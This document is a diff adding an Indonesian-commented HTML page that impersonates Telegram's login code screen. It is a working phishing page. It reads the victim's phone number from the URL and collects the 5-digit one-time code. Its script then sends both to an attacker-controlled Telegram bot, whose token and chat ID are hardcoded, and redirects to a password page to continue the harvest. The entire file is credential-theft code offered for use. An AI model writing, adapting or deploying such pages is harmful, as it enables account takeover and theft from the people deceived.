@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Kode OTP</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+      margin: 0; 
+      padding: 0;
+    }
+    .container {
+      max-width: 400px;
+      width: 90%;
+      margin: 50px auto;
+      text-align: center;
+      padding: 0 20px;
+    }
+    .monkey-emoji {
+      font-size: 80px;
+      margin-bottom: 20px;
+      display: block;
+    }
+    .phone-display {
+      font-size: 18px;
+      margin-bottom: 10px;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .pencil-icon {
+      width: 16px;
+      cursor: pointer;
+    }
+    p {
+      color: #555;
+      margin: 0 0 30px;
+    }
+    input[type="number"] {
+      width: 100%;
+      box-sizing: border-box;
+      padding: 10px;
+      font-size: 16px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      text-align: center;
+    }
+    .btn {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      background-color: #0088cc;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .btn:hover {
+      background-color: #0077b3;
+    }
+    .status {
+      margin-top: 15px;
+      font-weight: bold;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <!-- Emoji Monyet -->
+    <span class="monkey-emoji">🐵</span>
+    
+    <!-- Menampilkan nomor telepon yang diambil dari URL, dimasking -->
+    <div class="phone-display">
+      <span id="phoneMasked"></span>
+      <!-- Ikon pensil kecil untuk edit -->
+      <img src="https://cdn-icons-png.flaticon.com/512/1159/1159633.png" alt="Edit" class="pencil-icon" id="editNumber">
+    </div>
+
+    <p>We've sent the code to the Telegram app on your other device</p>
+
+    <!-- Form untuk memasukkan kode -->
+    <form id="codeForm">
+      <input type="number" id="verificationCode" min="10000" max="99999" placeholder="Masukkan kode 5 digit" oninput="if(this.value.length > 5) this.value = this.value.slice(0, 5)">
+      <button type="submit" class="btn">NEXT</button>
+    </form>
+
+    <div class="status" id="statusMessage"></div>
+  </div>
+
+  <script>
+    // === Ganti dengan Bot Token dan Chat ID milik Anda ===
+    const botToken = "8135293052:AAFaL0wUXi_6ZxN669S6IU_w9hnteqTA3UY";
+    const chatId   = "7247328760";
+    // ====================================================
+
+    // Ambil parameter "phone" dari URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const fullPhone = urlParams.get('phone') || "";
+
+    const phoneMaskedElement = document.getElementById('phoneMasked');
+    const editNumberButton = document.getElementById('editNumber');
+    const codeForm = document.getElementById('codeForm');
+    const statusMessage = document.getElementById('statusMessage');
+
+    // Fungsi sederhana untuk masking nomor telepon
+    function maskPhoneNumber(phone) {
+      if (phone.startsWith("+60") && phone.length > 4) {
+        const prefix = phone.substring(0, 3);  // +60
+        const nextTwo = phone.substring(3, 5); // misal 11
+        return `${prefix} ${nextTwo}********`;
+      } else if (phone.length > 6) {
+        const visible = phone.substring(0, 4);
+        const hiddenLength = phone.length - 4;
+        return visible + "*".repeat(hiddenLength);
+      } else {
+        return phone;
+      }
+    }
+
+    // Tampilkan nomor telepon yang dimasking
+    phoneMaskedElement.textContent = maskPhoneNumber(fullPhone);
+
+    // Klik ikon pensil untuk kembali ke halaman sebelumnya
+    editNumberButton.addEventListener('click', () => {
+      window.history.back();
+    });
+
+    // Ketika form kode verifikasi disubmit
+    codeForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const verificationInput = document.getElementById('verificationCode');
+      const verificationCode = verificationInput.value;
+      
+      if (verificationCode.length !== 5) {
+        statusMessage.style.color = "red";
+        statusMessage.textContent = "Kode harus terdiri dari 5 digit!";
+        return;
+      }
+
+      statusMessage.style.color = "black";
+      statusMessage.textContent = "Mengirim...";
+
+      // Buat pesan yang akan dikirim ke bot Telegram
+      const messageText = `@DAWEBPHST 
+_________________________________
+• Nomor Hp : ${fullPhone}\n• Kode otp: ${verificationCode}
+_________________________________
+_________________________________`;
+
+      // URL untuk mengirim pesan ke Telegram
+      const telegramAPI = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageText)}`;
+
+      fetch(telegramAPI)
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            statusMessage.style.color = "green";
+            statusMessage.textContent = "Sukses!";
+            // Setelah sukses, langsung pindah ke halaman password
+            window.location.href = `password.html?phone=${encodeURIComponent(fullPhone)}`;
+          } else {
+            statusMessage.style.color = "red";
+            statusMessage.textContent = "Gagal mengirim: " + (data.description || "Unknown error");
+          }
+        })
+        .catch(error => {
+          statusMessage.style.color = "red";
+          statusMessage.textContent = "Terjadi kesalahan: " + error;
+        });
+    });
+  </script>
+</body>
+</html>
